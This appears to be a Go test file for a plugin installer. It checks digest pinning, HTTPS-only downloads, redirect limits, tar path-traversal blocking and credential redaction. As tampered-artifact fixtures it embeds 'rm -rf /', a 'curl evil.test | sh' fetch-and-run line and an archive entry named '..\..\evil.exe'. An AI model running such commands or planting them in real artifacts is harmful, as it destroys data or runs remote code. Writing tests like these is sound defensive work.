package plugindist

import (
	"context"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/setthasit/Lore/internal/config"
	"github.com/setthasit/Lore/internal/errors/internalerror"
	"github.com/setthasit/Lore/internal/plugindist/plugindisttest"
)

const stubBinary = "#!/bin/sh\necho lore-linear\n"

type scene struct {
	fake      *plugindisttest.GitHub
	store     *Store
	installer *Installer
	coord     Coordinate
	asset     string
	archive   []byte
}

func newScene(t *testing.T) *scene {
	t.Helper()

	coord, err := Resolve(".", config.PluginDecl{Name: "linear", From: "github.com/jdoe/lore-linear@v0.3.1"})
	if err != nil {
		t.Fatalf("resolve: %v", err)
	}

	fake := plugindisttest.NewGitHub(t, "jdoe", "lore-linear")
	store := NewStore(t.TempDir())
	asset := coord.assetName(store.platform)
	archive := plugindisttest.Archive(t, coord.binaryName(store.platform), []byte(stubBinary))
	fake.Publish("v0.3.1", map[string][]byte{asset: archive})

	return &scene{
		fake: fake, store: store, installer: fakeInstaller(fake, store),
		coord: coord, asset: asset, archive: archive,
	}
}

func (s *scene) install(t *testing.T, lock *Lock, rewrite bool) (Result, error) {
	t.Helper()

	return s.installer.Install(context.Background(), Request{Coordinate: s.coord, Rewrite: rewrite}, lock)
}

func (s *scene) installed(t *testing.T) (*Lock, Result) {
	t.Helper()

	lock := &Lock{}
	result, err := s.install(t, lock, false)
	if err != nil {
		t.Fatalf("install: %v", err)
	}
	return lock, result
}

func TestInstallWithNoDeclaredPubKeyIsUnsigned(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	if scene.coord.PubKey != "" {
		t.Fatalf("the scene declares pubkey: %q", scene.coord.PubKey)
	}

	_, result := scene.installed(t)
	if result.Signed {
		t.Fatal("an install with no declared key reports a verified signature")
	}
}

func TestInstallPinsVerifiesAndCaches(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	lock, result := scene.installed(t)

	if !result.Pinned || result.Locked {
		t.Fatalf("result pinned = %v, locked = %v; want a first install to pin", result.Pinned, result.Locked)
	}
	if want := digestOf(scene.archive); result.LockedDigest != want {
		t.Fatalf("artifact digest = %q, want %q", result.LockedDigest, want)
	}

	artifact, locked := lock.Artifact("linear", scene.store.platform)
	if !locked {
		t.Fatalf("nothing locked for %s: %+v", scene.store.platform.Key(), lock.Plugins)
	}
	if artifact.Digest != result.LockedDigest {
		t.Fatalf("locked digest = %q, want %q", artifact.Digest, result.LockedDigest)
	}
	if artifact.URL != scene.fake.DownloadURL("v0.3.1", scene.asset) {
		t.Fatalf("locked url = %q", artifact.URL)
	}

	want := filepath.Join(scene.store.root, "plugins", "linear", "v0.3.1", scene.coord.binaryName(scene.store.platform))
	if result.Binary != want {
		t.Fatalf("binary = %q, want %q", result.Binary, want)
	}
	if body := readFile(t, result.Binary); body != stubBinary {
		t.Fatalf("installed binary = %q, want the archive's entry", body)
	}
	record, err := readInstallRecord(filepath.Dir(result.Binary))
	if err != nil {
		t.Fatalf("read the install record: %v", err)
	}
	wantRecord := installRecord{
		Binary:         filepath.Base(result.Binary),
		BinaryDigest:   result.BinaryDigest,
		ArtifactDigest: result.LockedDigest,
		From:           scene.coord.From,
	}
	if record != wantRecord {
		t.Fatalf("install record = %+v, want %+v", record, wantRecord)
	}

	report, err := scene.store.Locate(scene.coord, lock)
	if err != nil {
		t.Fatalf("locate the installed binary: %v", err)
	}
	if report.Binary != result.Binary || report.Version != "v0.3.1" {
		t.Fatalf("located %+v, want v0.3.1 at %s", report, result.Binary)
	}
}

func TestInstallRefusesATamperedArtifact(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	scene.fake.Attach("v0.3.1", scene.asset, plugindisttest.Archive(t, scene.coord.binaryName(scene.store.platform), []byte("rm -rf /\n")))

	lock := &Lock{}
	_, err := scene.install(t, lock, false)
	if err == nil {
		t.Fatal("installing a tampered artifact succeeded, want a refusal")
	}
	if !strings.Contains(err.Error(), "digest mismatch") {
		t.Fatalf("error %q does not report a digest mismatch", err)
	}
	if len(lock.Plugins) != 0 {
		t.Fatalf("a refused install pinned %+v", lock.Plugins)
	}
	if _, err := os.Stat(cacheDir(t, scene.store, "linear", "v0.3.1")); !os.IsNotExist(err) {
		t.Fatal("a refused install left a cached version behind")
	}
}

func TestInstallRefusesWhenTheLockedDigestNoLongerMatches(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	lock, first := scene.installed(t)

	rewritten := plugindisttest.Archive(t, scene.coord.binaryName(scene.store.platform), []byte("curl evil.test | sh\n"))
	scene.fake.Publish("v0.3.1", map[string][]byte{scene.asset: rewritten})

	_, err := scene.install(t, lock, false)
	if err == nil {
		t.Fatal("installing over a locked digest succeeded, want a refusal")
	}
	if !internalerror.IsPrecondition(err) {
		t.Fatalf("kind = %v, want precondition", internalerror.KindOf(err))
	}
	for _, want := range []string{"digest mismatch", first.LockedDigest, digestOf(rewritten)} {
		if !strings.Contains(err.Error(), want) {
			t.Fatalf("error %q does not mention %q", err, want)
		}
	}

	artifact, _ := lock.Artifact("linear", scene.store.platform)
	if artifact.Digest != first.LockedDigest {
		t.Fatalf("the refused install rewrote the pin to %q", artifact.Digest)
	}
}

func TestInstallRefusesAVersionTheLockDisagreesWith(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	lock, _ := scene.installed(t)

	moved, err := scene.coord.AtVersion("v0.4.0")
	if err != nil {
		t.Fatalf("move the coordinate: %v", err)
	}
	scene.coord = moved

	if _, err := scene.install(t, lock, false); err == nil {
		t.Fatal("installing a version the lock disagrees with succeeded, want a refusal")
	} else {
		for _, want := range []string{"is locked at v0.3.1", "lore plugin update linear"} {
			if !strings.Contains(err.Error(), want) {
				t.Fatalf("error %q does not mention %q", err, want)
			}
		}
	}
}

func TestInstallUpdateRewritesTheLockedDigest(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	lock, first := scene.installed(t)

	next := plugindisttest.Archive(t, scene.coord.binaryName(scene.store.platform), []byte("#!/bin/sh\necho v0.4.0\n"))
	moved, err := scene.coord.AtVersion("v0.4.0")
	if err != nil {
		t.Fatalf("move the coordinate: %v", err)
	}
	scene.coord = moved
	scene.fake.Publish("v0.4.0", map[string][]byte{moved.assetName(scene.store.platform): next})

	result, err := scene.install(t, lock, true)
	if err != nil {
		t.Fatalf("update: %v", err)
	}
	if result.LockedDigest == first.LockedDigest {
		t.Fatal("update kept the old digest")
	}

	entry, _ := lock.Entry("linear")
	if entry.Version != "v0.4.0" || entry.From != "github.com/jdoe/lore-linear@v0.4.0" {
		t.Fatalf("entry = %+v, want v0.4.0", entry)
	}
	artifact, _ := lock.Artifact("linear", scene.store.platform)
	if artifact.Digest != result.LockedDigest {
		t.Fatalf("locked digest = %q, want %q", artifact.Digest, result.LockedDigest)
	}

	if _, err := os.Stat(cacheDir(t, scene.store, "linear", "v0.3.1")); err != nil {
		t.Fatalf("v0.3.1 was removed by an update: %v", err)
	}
}

func TestInstallMissingAssetNamesWhatWasLookedForAndWhatExists(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	store := NewStore(scene.store.root)
	store.platform = Platform{OS: "plan9", Arch: "mips"}
	installer := fakeInstaller(scene.fake, store)

	_, err := installer.Install(context.Background(), Request{Coordinate: scene.coord}, &Lock{})
	if err == nil {
		t.Fatal("installing for a platform with no asset succeeded, want a refusal")
	}
	for _, want := range []string{"lore-linear_0.3.1_plan9_mips.tar.gz", scene.asset, ChecksumsAsset} {
		if !strings.Contains(err.Error(), want) {
			t.Fatalf("error %q does not mention %q", err, want)
		}
	}
}

func TestInstallRefusesAnEmptyChecksumsList(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	scene.fake.Attach("v0.3.1", ChecksumsAsset, []byte{})

	lock := &Lock{}
	_, err := scene.install(t, lock, false)
	if err == nil {
		t.Fatal("installing against an empty checksums list succeeded, want a refusal")
	}
	for _, want := range []string{ChecksumsAsset, scene.asset} {
		if !strings.Contains(err.Error(), want) {
			t.Fatalf("error %q does not mention %q", err, want)
		}
	}
	if len(lock.Plugins) != 0 {
		t.Fatalf("a refused install pinned %+v", lock.Plugins)
	}
	if _, err := os.Stat(cacheDir(t, scene.store, "linear", "v0.3.1")); !os.IsNotExist(err) {
		t.Fatal("a refused install left a cached version behind")
	}
}

func TestInstallUnresolvableCoordinateWritesNoLock(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	unknown, err := scene.coord.AtVersion("v9.9.9")
	if err != nil {
		t.Fatalf("move the coordinate: %v", err)
	}

	lock := &Lock{}
	_, err = scene.installer.Install(context.Background(), Request{Coordinate: unknown}, lock)
	if err == nil {
		t.Fatal("installing an unknown tag succeeded, want a refusal")
	}
	for _, want := range []string{"github.com/jdoe/lore-linear@v9.9.9", "tag v9.9.9", "404"} {
		if !strings.Contains(err.Error(), want) {
			t.Fatalf("error %q does not name the coordinate and the step that failed: missing %q", err, want)
		}
	}

	if len(lock.Plugins) != 0 {
		t.Fatalf("a refused install pinned %+v", lock.Plugins)
	}
}

func TestInstallPinsLatestToAConcreteVersion(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	floating, err := ResolveInstall(".", config.PluginDecl{Name: "linear", From: "github.com/jdoe/lore-linear@latest"})
	if err != nil {
		t.Fatalf("resolve @latest: %v", err)
	}
	if !floating.Floating() {
		t.Fatal("@latest does not report itself floating")
	}

	pinned, err := scene.installer.Pin(context.Background(), floating)
	if err != nil {
		t.Fatalf("pin: %v", err)
	}
	if pinned.Version != "v0.3.1" || pinned.From != "github.com/jdoe/lore-linear@v0.3.1" {
		t.Fatalf("pinned = %+v, want v0.3.1", pinned)
	}

	if _, err := scene.installer.Install(context.Background(), Request{Coordinate: floating}, &Lock{}); err == nil {
		t.Fatal("installing a floating coordinate succeeded")
	}
}

func TestInstallLocalCoordinateIsNeverLocked(t *testing.T) {
	t.Parallel()

	dir := t.TempDir()
	path := filepath.Join(dir, "lore-scratch")
	if err := os.WriteFile(path, []byte(stubBinary), 0o755); err != nil {
		t.Fatalf("seed a local plugin: %v", err)
	}

	coord, err := Resolve(".", config.PluginDecl{Name: "scratch", From: path})
	if err != nil {
		t.Fatalf("resolve: %v", err)
	}

	lock := &Lock{}
	installer := NewInstaller(NewStore(t.TempDir()))
	result, err := installer.Install(context.Background(), Request{Coordinate: coord}, lock)
	if err != nil {
		t.Fatalf("install a local plugin: %v", err)
	}
	if result.Binary != path {
		t.Fatalf("binary = %q, want %q", result.Binary, path)
	}
	if len(lock.Plugins) != 0 {
		t.Fatalf("a local plugin was locked: %+v", lock.Plugins)
	}
	if !strings.Contains(result.Warning, "development only") {
		t.Fatalf("warning = %q", result.Warning)
	}
}

func TestInstallURLCoordinatePinsTheFirstFetch(t *testing.T) {
	t.Parallel()

	served := serveArtifact(t, "acme-crm", "/lore/acme-crm/v2.0.1.tar.gz",
		plugindisttest.Archive(t, "acme-crm", []byte(stubBinary)))

	lock := &Lock{}
	result, err := served.install(t, lock, "")
	if err != nil {
		t.Fatalf("install: %v", err)
	}
	if !result.Trust {
		t.Fatal("an unsigned URL artifact with nothing to compare against does not report trust on first use")
	}
	if result.Version != "v2.0.1" {
		t.Fatalf("version = %q, want v2.0.1 from the URL", result.Version)
	}

	served.publish(plugindisttest.Archive(t, "acme-crm", []byte("evil\n")))
	if _, err := served.install(t, lock, ""); err == nil {
		t.Fatal("re-installing changed bytes over a pin succeeded, want a refusal")
	} else if !strings.Contains(err.Error(), "digest mismatch") {
		t.Fatalf("error %q does not report a digest mismatch", err)
	}
}

// A tar entry name is not a path, and `path.Base` splits on / alone: on Windows
// an entry named ..\..\evil.exe would be joined into a write outside the cache.
func TestUnpackSkipsArchiveEntriesThatAreNotOneFileName(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	archive := plugindisttest.TarGz(t,
		plugindisttest.TarEntry{Name: "LICENSE", Mode: 0o644, Body: []byte("MIT")},
		plugindisttest.TarEntry{Name: `..\..\evil.exe`, Mode: 0o755, Body: []byte("evil\n")},
	)

	files, err := untar(scene.coord, archive)
	if err != nil {
		t.Fatalf("untar: %v", err)
	}
	if got := archivedNames(files); len(got) != 1 || got[0] != "LICENSE" {
		t.Fatalf("entries = %v, want LICENSE alone", got)
	}

	_, _, err = unpack(scene.coord, scene.store.platform, scene.asset, archive)
	if err == nil {
		t.Fatal("unpacking an archive whose only executable escapes the cache succeeded, want a refusal")
	}
	if !strings.Contains(err.Error(), "holds no plugin binary") {
		t.Fatalf("error %q does not refuse to pick a binary", err)
	}
}

func TestUnpackTakesTheBinaryFromUnderADirectoryPrefix(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	platform := scene.store.platform
	binaryName := scene.coord.binaryName(platform)
	archive := plugindisttest.TarGz(t,
		plugindisttest.TarEntry{Name: "dist/README.md", Mode: 0o644, Body: []byte("# acme")},
		plugindisttest.TarEntry{Name: "dist/" + binaryName, Mode: 0o755, Body: []byte(stubBinary)},
	)

	name, body, err := unpack(scene.coord, platform, scene.asset, archive)
	if err != nil {
		t.Fatalf("unpack: %v", err)
	}
	if name != binaryName {
		t.Fatalf("binary = %q, want %q", name, binaryName)
	}
	if string(body) != stubBinary {
		t.Fatalf("body = %q, want the nested binary", body)
	}
}

func TestUnpackFallsBackToTheArchivesOnlyExecutable(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	platform := scene.store.platform
	const renamed = "linear-cli"

	name, body, err := unpack(scene.coord, platform, scene.asset, plugindisttest.TarGz(t,
		plugindisttest.TarEntry{Name: "LICENSE", Mode: 0o644, Body: []byte("MIT")},
		plugindisttest.TarEntry{Name: renamed, Mode: 0o755, Body: []byte(stubBinary)},
	))
	if err != nil {
		t.Fatalf("unpack an archive whose binary is named otherwise: %v", err)
	}
	if name != renamed {
		t.Fatalf("binary = %q, want the one executable %q", name, renamed)
	}
	if string(body) != stubBinary {
		t.Fatalf("body = %q, want the renamed binary", body)
	}

	_, _, err = unpack(scene.coord, platform, scene.asset, plugindisttest.TarGz(t,
		plugindisttest.TarEntry{Name: renamed, Mode: 0o755, Body: []byte(stubBinary)},
		plugindisttest.TarEntry{Name: "postinstall.sh", Mode: 0o755, Body: []byte("evil\n")},
	))
	if err == nil {
		t.Fatal("unpacking an archive holding two executables succeeded, want a refusal")
	}
	for _, want := range []string{"holds no plugin binary", renamed, "postinstall.sh"} {
		if !strings.Contains(err.Error(), want) {
			t.Fatalf("error %q does not mention %q", err, want)
		}
	}
}

func TestInstallOfABareBinaryURLTakesTheArtifactAsTheBinary(t *testing.T) {
	t.Parallel()

	served := serveArtifact(t, "acme-crm", "/lore/acme-crm/v2.0.1", []byte(stubBinary))
	result, err := served.install(t, &Lock{}, "")
	if err != nil {
		t.Fatalf("install a bare binary: %v", err)
	}
	if want := served.coord.binaryName(hostPlatform()); filepath.Base(result.Binary) != want {
		t.Fatalf("binary = %q, want it cached as %q", result.Binary, want)
	}
	if got := readFile(t, result.Binary); got != stubBinary {
		t.Fatalf("binary = %q, want the served bytes", got)
	}
}

func TestInstallOfATgzURLUnpacksTheArchive(t *testing.T) {
	t.Parallel()

	served := serveArtifact(t, "acme-crm", "/lore/acme-crm/v2.0.1.tgz",
		plugindisttest.Archive(t, "acme-crm", []byte(stubBinary)))
	result, err := served.install(t, &Lock{}, "")
	if err != nil {
		t.Fatalf("install a .tgz artifact: %v", err)
	}
	if result.Version != "v2.0.1" {
		t.Fatalf("version = %q, want v2.0.1 with the suffix taken off", result.Version)
	}
	if got := readFile(t, result.Binary); got != stubBinary {
		t.Fatalf("binary = %q, want the archived binary rather than the archive", got)
	}
}

func TestBoundedGetRefusesAPlaintextTarget(t *testing.T) {
	t.Parallel()

	var hits atomic.Int64
	plaintext := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		hits.Add(1)
		_, _ = w.Write([]byte("evil\n"))
	}))
	t.Cleanup(plaintext.Close)

	body, err := BoundedGet(context.Background(), plaintext.Client(),
		plaintext.URL+"/lore/acme-crm/v2.0.1.tar.gz", maxArtifactBytes)
	if err == nil {
		t.Fatal("downloading over plaintext http succeeded, want a refusal")
	}
	if body != nil {
		t.Fatalf("body = %q, want nothing downloaded", body)
	}
	if !strings.Contains(err.Error(), "plugin traffic stays on https") {
		t.Fatalf("error %q does not refuse the plaintext target", err)
	}
	if !internalerror.IsBadRequest(err) {
		t.Fatalf("kind = %v, want bad request", internalerror.KindOf(err))
	}
	if served := hits.Load(); served != 0 {
		t.Fatalf("the plaintext endpoint served %d requests, want none to leave", served)
	}
}

func TestBoundedGetRefusesARedirectOffHTTPS(t *testing.T) {
	t.Parallel()

	var hits atomic.Int64
	plaintext := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		hits.Add(1)
		_, _ = w.Write([]byte("evil\n"))
	}))
	t.Cleanup(plaintext.Close)

	downgrade := plaintext.URL + "/lore/acme-crm/v2.0.1.tar.gz"
	secure := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, downgrade, http.StatusFound)
	}))
	t.Cleanup(secure.Close)

	body, err := BoundedGet(context.Background(), secure.Client(),
		secure.URL+"/lore/acme-crm/v2.0.1.tar.gz", maxArtifactBytes)
	if err == nil {
		t.Fatal("a redirect onto plaintext http was followed, want a refusal")
	}
	if body != nil {
		t.Fatalf("body = %q, want nothing read over plaintext", body)
	}
	if !strings.Contains(err.Error(), "refusing a redirect to "+downgrade) {
		t.Fatalf("error %q does not name the refused hop", err)
	}
	if served := hits.Load(); served != 0 {
		t.Fatalf("the plaintext endpoint served %d requests, want none", served)
	}
}

// A release asset URL redirects to a CDN, so refusing redirects outright breaks every real install.
func TestBoundedGetFollowsAnHTTPSRedirect(t *testing.T) {
	t.Parallel()

	const payload = "acme-crm archive\n"
	server := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/cdn/acme-crm.tar.gz" {
			_, _ = w.Write([]byte(payload))
			return
		}
		http.Redirect(w, r, "/cdn/acme-crm.tar.gz", http.StatusFound)
	}))
	t.Cleanup(server.Close)

	body, err := BoundedGet(context.Background(), server.Client(),
		server.URL+"/releases/download/v2.0.1/acme-crm.tar.gz", maxArtifactBytes)
	if err != nil {
		t.Fatalf("BoundedGet: %v", err)
	}
	if string(body) != payload {
		t.Fatalf("body = %q, want the redirect target's body", body)
	}
}

// A custom CheckRedirect replaces net/http's default 10-hop cap, so the policy bounds the chain itself.
func TestBoundedGetStopsAnHTTPSRedirectLoop(t *testing.T) {
	t.Parallel()

	var hops atomic.Int64
	server := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		hops.Add(1)
		http.Redirect(w, r, "/loop", http.StatusFound)
	}))
	t.Cleanup(server.Close)

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	_, err := BoundedGet(ctx, server.Client(), server.URL+"/loop", maxArtifactBytes)
	if err == nil {
		t.Fatal("an https redirect loop was followed to a body, want a refusal")
	}
	if !strings.Contains(err.Error(), "stopped after 10 redirects") {
		t.Fatalf("error %q does not stop the loop on hop count", err)
	}
	if served := hops.Load(); served != maxRedirects {
		t.Fatalf("the loop served %d hops, want it stopped at %d", served, maxRedirects)
	}
}

func TestBoundedGetClassifiesTheResponse(t *testing.T) {
	t.Parallel()

	const limit = 1 << 20

	cases := map[string]struct {
		status int
		size   int
		want   string
		kind   internalerror.Kind
	}{
		"one byte under the limit": {status: http.StatusOK, size: limit - 1},
		"exactly the limit":        {status: http.StatusOK, size: limit},
		"one byte over the limit": {
			status: http.StatusOK,
			size:   limit + 1,
			want:   "is larger than the 1 MiB this build will download",
			kind:   internalerror.KindPrecondition,
		},
		"nothing published": {
			status: http.StatusNotFound,
			want:   "nothing published at",
			kind:   internalerror.KindNotFound,
		},
		"server error": {
			status: http.StatusBadGateway,
			want:   "responded 502",
			kind:   internalerror.KindPrecondition,
		},
	}

	for name, c := range cases {
		t.Run(name, func(t *testing.T) {
			t.Parallel()

			server := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
				w.WriteHeader(c.status)
				_, _ = w.Write([]byte(strings.Repeat("a", c.size)))
			}))
			t.Cleanup(server.Close)

			body, err := BoundedGet(context.Background(), server.Client(), server.URL+"/index.json", limit)
			if c.want == "" {
				if err != nil {
					t.Fatalf("BoundedGet() = %v, want the body", err)
				}
				if len(body) != c.size {
					t.Fatalf("body = %d bytes, want %d", len(body), c.size)
				}
				return
			}

			if err == nil {
				t.Fatalf("BoundedGet() returned %d bytes, want a refusal", len(body))
			}
			if body != nil {
				t.Errorf("body = %d bytes, want nothing returned with an error", len(body))
			}
			if !strings.Contains(err.Error(), c.want) {
				t.Errorf("error = %q, want it to mention %q", err, c.want)
			}
			if internalerror.KindOf(err) != c.kind {
				t.Errorf("kind = %v, want %v", internalerror.KindOf(err), c.kind)
			}
		})
	}
}

const (
	fakeUser  = "svcaccount"
	fakeToken = "fake-not-a-real-token"
	fakeQuery = "sig=fake-signature"
)

func credentialed(target string) string {
	scheme, rest, found := strings.Cut(target, "://")
	if !found {
		return target
	}
	return scheme + "://" + fakeUser + ":" + fakeToken + "@" + rest + "?" + fakeQuery
}

func assertRedacted(t *testing.T, err error, keep string) {
	t.Helper()

	message := internalerror.MessageOf(err)
	for _, secret := range []string{fakeUser, fakeToken, fakeQuery} {
		if strings.Contains(message, secret) {
			t.Errorf("refusal %q echoes %q", message, secret)
		}
	}
	if !strings.Contains(message, keep) {
		t.Errorf("refusal %q no longer names %q", message, keep)
	}
}

func TestBoundedGetRefusalsDoNotEchoURLCredentials(t *testing.T) {
	t.Parallel()

	const limit = 1 << 20

	respond := func(t *testing.T, status, size int) *httptest.Server {
		server := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
			w.WriteHeader(status)
			_, _ = w.Write([]byte(strings.Repeat("a", size)))
		}))
		t.Cleanup(server.Close)
		return server
	}
	index := func(server *httptest.Server) string { return server.URL + "/index.json" }

	cases := map[string]func(t *testing.T) (client *http.Client, target, keep string){
		"unreachable": func(t *testing.T) (*http.Client, string, string) {
			server := respond(t, http.StatusOK, 0)
			server.Close()
			return server.Client(), credentialed(index(server)), index(server)
		},
		"nothing published": func(t *testing.T) (*http.Client, string, string) {
			server := respond(t, http.StatusNotFound, 0)
			return server.Client(), credentialed(index(server)), index(server)
		},
		"a status that is not ok": func(t *testing.T) (*http.Client, string, string) {
			server := respond(t, http.StatusBadGateway, 0)
			return server.Client(), credentialed(index(server)), index(server)
		},
		"larger than the cap": func(t *testing.T) (*http.Client, string, string) {
			server := respond(t, http.StatusOK, limit+1)
			return server.Client(), credentialed(index(server)), index(server)
		},
		"a plaintext target": func(t *testing.T) (*http.Client, string, string) {
			plaintext := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
				t.Error("the plaintext endpoint was reached, want the refusal before any request")
			}))
			t.Cleanup(plaintext.Close)
			return plaintext.Client(), credentialed(index(plaintext)), index(plaintext)
		},
		"a redirect onto plaintext": func(t *testing.T) (*http.Client, string, string) {
			plaintext := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
				t.Error("the plaintext hop was followed, want it refused")
			}))
			t.Cleanup(plaintext.Close)

			downgrade := credentialed(index(plaintext))
			secure := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				http.Redirect(w, r, downgrade, http.StatusFound)
			}))
			t.Cleanup(secure.Close)
			return secure.Client(), index(secure), index(plaintext)
		},
	}

	for name, scene := range cases {
		t.Run(name, func(t *testing.T) {
			t.Parallel()

			client, target, keep := scene(t)
			body, err := BoundedGet(context.Background(), client, target, limit)
			if err == nil {
				t.Fatalf("BoundedGet() returned %d bytes, want a refusal", len(body))
			}
			assertRedacted(t, err, keep)
		})
	}
}

func TestInstallRefusalDoesNotEchoAURLCoordinatesCredentials(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	target := scene.fake.DownloadURL("unpublished", "v2.0.1.tar.gz")

	coord, err := Resolve(".", config.PluginDecl{Name: "linear", From: credentialed(target)})
	if err != nil {
		t.Fatalf("resolve the url coordinate: %v", err)
	}
	if coord.Origin != OriginURL {
		t.Fatalf("origin = %s, want a url coordinate", coord.Origin)
	}
	scene.coord = coord

	_, err = scene.install(t, &Lock{}, false)
	if err == nil {
		t.Fatal("installing an unpublished artifact succeeded, want a refusal")
	}
	if !internalerror.IsNotFound(err) {
		t.Fatalf("kind = %v, want not found", internalerror.KindOf(err))
	}
	assertRedacted(t, err, target)
}

func TestChecksumsRefusalDoesNotEchoURLCredentials(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	published := scene.fake.DownloadURL("v0.3.1", "unpublished-"+ChecksumsAsset)

	_, _, err := scene.installer.expected(
		context.Background(), scene.coord, scene.asset, scene.archive, credentialed(published))
	if err == nil {
		t.Fatal("downloading an unpublished checksums file succeeded, want a refusal")
	}
	if !internalerror.IsNotFound(err) {
		t.Fatalf("kind = %v, want not found", internalerror.KindOf(err))
	}
	assertRedacted(t, err, published)
}

func TestInstallOfAURLDerivedVersionCachesItUnderThatVersion(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	body := []byte("#!/bin/sh\necho build-77\n")
	scene.fake.Publish("build-77", map[string][]byte{"build-77.tar.gz": plugindisttest.Archive(t, "linear", body)})

	coord, err := Resolve(".", config.PluginDecl{
		Name: "linear", From: scene.fake.DownloadURL("build-77", "build-77.tar.gz"),
	})
	if err != nil {
		t.Fatalf("resolve the url coordinate: %v", err)
	}
	if coord.Origin != OriginURL || coord.Version != "build-77" {
		t.Fatalf("coordinate = %s@%s, want a url origin at build-77", coord.Origin, coord.Version)
	}
	scene.coord = coord

	lock := &Lock{}
	result, err := scene.install(t, lock, false)
	if err != nil {
		t.Fatalf("install build-77: %v", err)
	}

	want := filepath.Join(scene.store.root, "plugins", "linear", "build-77", "linear")
	if result.Binary != want {
		t.Fatalf("binary = %q, want %q", result.Binary, want)
	}
	if installed := readFile(t, result.Binary); installed != string(body) {
		t.Fatalf("installed binary = %q, want the archive's entry", installed)
	}

	located, err := scene.store.Binary(coord, lock)
	if err != nil {
		t.Fatalf("locate build-77: %v", err)
	}
	if located != want {
		t.Fatalf("located %q, want %q", located, want)
	}
}
